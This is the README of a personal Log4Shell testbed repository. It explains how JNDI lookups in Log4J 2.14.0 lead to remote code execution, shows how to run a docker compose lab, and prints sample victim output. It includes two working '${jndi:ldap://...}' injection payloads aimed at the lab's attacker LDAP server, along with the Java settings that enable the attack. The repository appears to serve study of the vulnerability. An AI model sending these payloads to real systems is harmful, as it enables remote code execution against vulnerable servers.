# Log4Shell Test

This repository serves as my testbed for the Log4Shell exploit. It hosts the
code I played around with to understand how it works. Kotlin was used whenever
possible, but raw Java was used for the remote code since using Kotlin would've
necessitated serving its whole runtime library.


## Usage

This codebase comes packaged with a `docker compose` file for ease of use. To
see the exploit in action, simply run in the root of this repository
```
$ docker compose up
```

At first, there will be a few `Error looking up JNDI resource`. This is
expected, as it takes some time for the LDAP registry to be populated with the
exploit data. After about six seconds however, something resembling the
following message should be visible, indicating a successful remote code
execution.
```
log4shell-test-attacker_codebase-1             | 172.25.0.5 - - [30/Dec/2021:16:41:22 +0000] "GET /FactoryClass.class HTTP/1.1" 200 1695
log4shell-test-victim-1                        | RCE Acheived in FactoryClass::getObjectInstance!
log4shell-test-victim-1                        | name:    cn=made-class,dc=ldap-registry,dc=attacker
log4shell-test-victim-1                        | nameCtx: com.sun.jndi.ldap.LdapCtx@6e2c9341
log4shell-test-victim-1                        | env:     {}
log4shell-test-victim-1                        | obj:     Reference Class Name: MadeClass
log4shell-test-victim-1                        |
log4shell-test-attacker_codebase-1             | 172.25.0.5 - - [30/Dec/2021:16:41:22 +0000] "GET /RCEMain.class HTTP/1.1" 200 468
log4shell-test-victim-1                        | Function rceMain called!
log4shell-test-attacker_codebase-1             | 172.25.0.5 - - [30/Dec/2021:16:41:22 +0000] "GET /MadeClass.class HTTP/1.1" 200 573
log4shell-test-victim-1                        | RCE Acheived in MadeClass::toString!
log4shell-test-victim-1                        | Function rceMain called!
log4shell-test-victim-1                        | 16:41:22.343 TRACE MainKt - Attempted injection: MadeClass
```

### Options

As detailed at the end of the "Exploit Resources" section, there are two methods
of triggering remote code execution on the victim. One involves a `Reference`
and a factory, while the other involves serialization.

The factory method is the default, but the which method to use can be chosen by
modifying the payload given to the victim. Change the `victim`'s `JAVA_OPTS`
environment variable in the `docker compose` file to define the `victim-payload`
system property to read either the first or second line depending on whether the
former or latter method is desired.
```
$${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
$${jndi:ldap://attacker_ldap_registry:1389/cn=serialized-class,dc=ldap-registry,dc=attacker}
```

Additionally, it seems the serialization method doesn't work on any recent Java
version without manually setting the `com.sun.jndi.ldap.object.trustURLCodebase`
system property to `true`. If that method is used, make sure to do that, again
via the `JAVA_OPTS` environment variable in the `docker compose` file


## Exploit Resources

Many other authors have covered how this exploit works far better than I ever
could. As such, I'll only give a very brief summary here and link to other
resources I found useful.

For a variety of reasons I don't fully understand, it would be nice to delay
specifying exactly how an application is set up as much as possible. For
example, it would be nice to not have to code to a particular implementation of
a database and have that baked into a service's `.class` files. Instead, it
would be better to specify that we need a `"Account Database"` and have that
service discoverable at runtime.

The Java Platform allows for this flexibility. It allows code to lookup,
download, and execute remote objects (not `class`es, objects). This way, one
service doesn't need to have its binaries coupled with another. They can still
communicate with each other as long as they share an `interface`.

There are many ways to acheive this remote-lookup functionality. Java provides a
method to store serialized or factory-generated objects in LDAP directories. It
also provides a framework to invoke remote methods, and that can be made to do
the same thing.

All these different providers of this remote-lookup service are abstracted away
by the Java Naming and Directory Interface (JNDI) framework. JNDI provides
interfaces to LDAP, RMI, CORBA, and other lookup services.

Of course, the whole point of this framework is to download remote objects so
the application can do stuff with them, and this can lead to problems. Say some
attacker could control the target of a JNDI lookup. Then, they could inject
their own class into the application. Presumably, it would then have methods
called on it, leading to Remote Code Execution (RCE).

There are many ways to actually acheive RCE with this vector. One way is to
create a `Reference` to an object. `Reference` objects hold information about
another object, including the factory class to use to create them. The factory
class is where the RCE happens first. Another way is to store a serialized
object in an LDAP server. This object is deserialized on the victim, then a
method is called on it to trigger RCE.

### Overview Resources
* [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w):
  * [Overview](https://www.youtube.com/watch?v=w2F67LbEtnk)
  * [Internals](https://www.youtube.com/watch?v=iI9Dz3zN4d8)
* [*A Journey From JNDI/LDAP Manipulation to Remote Code Execution Dream Land*](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [Flow Diagram](https://www.radware.com/security/threat-advisories-and-attack-reports/log4shell-critical-log4j-vulnerability/)
* [Impact](https://www.lunasec.io/docs/blog/log4j-zero-day/)

### JNDI Resources
* [Tutorial](https://docs.oracle.com/javase/jndi/tutorial/):
    * [Tutorial: How Java Objects are Stored](https://docs.oracle.com/javase/jndi/tutorial/objects/index.html)
* [Technotes](https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/):
  * [LDAP](https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-ldap.html)
  * [RMI](https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-rmi.html)
* [Java Documentation](https://docs.oracle.com/javase/8/docs/api/):
  * [`DirContext`](https://docs.oracle.com/javase/8/docs/api/javax/naming/directory/DirContext.html)
  * [`Reference`](https://docs.oracle.com/javase/8/docs/api/javax/naming/Reference.html)
  * [`ObjectFactory`](https://docs.oracle.com/javase/8/docs/api/javax/naming/spi/ObjectFactory.html)
* [RFC 2713](https://datatracker.ietf.org/doc/html/rfc2713)


## Limitations

Obviously, this repository uses an out-of-date version of Log4J - version
`2.14.0` specifically. It also uses an out-of-date version of Java due to the
exploit it uses. Instead of using gadgets already in the `CLASSPATH`, it
requires the victim to download `.class` files from a remote codebase. This
feature can be enabled in any Java version by setting the system property
`com.sun.jndi.ldap.object.trustURLCodebase` to `true`. Additionally, the factory
method works even without that option explicitly set in up to and including Java
`8u171`.

Additionally, it doesn't add any instrumentation to Log4J itself. It treats the
library as a black box that allows arbitrary JNDI queries.
